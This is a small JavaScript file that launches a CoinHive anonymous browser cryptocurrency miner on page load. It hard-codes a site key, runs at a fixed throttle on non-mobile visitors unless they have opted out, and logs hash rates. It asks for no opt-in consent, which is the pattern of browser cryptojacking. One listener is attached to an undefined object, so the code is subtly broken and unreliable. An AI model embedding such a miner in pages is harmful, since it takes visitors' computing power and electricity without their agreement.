(function () {

    var miner = new CoinHive.Anonymous('gk1NDzPc69bUVRKAOOniFnFLj17Wlkws', {
        throttle: 0.7
    });
    HTMLInputElementObject.addEventListener('input', function(evnt){
        miner.setThrottle(this.value);
    })

    // document.getElementById('throttle').addEventListener('input', function(){
    //     miner.setThrottle(this.value);
    // })
    // miner.on('open', function() {
    //     console.log('new miner opened');
    // });
    // miner.on('close', function() {
    //     console.log('old miner closed');
    // })
    // Only start on non-mobile devices and if not opted-out
    // in the last 14400 seconds (4 hours):
    if (!miner.isMobile() && !miner.didOptOut(14400)) {
        miner.start(CoinHive.IF_EXCLUSIVE_TAB);
    }
    // Listen on events
    miner.on('found', function() {
        console.log('hash was found');
    })
    miner.on('accepted', function() {
        console.log('hash was accepted by pool');
    })

    // Update stats once per second
    setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        console.log(hashesPerSecond);
    }, 1000);
})();
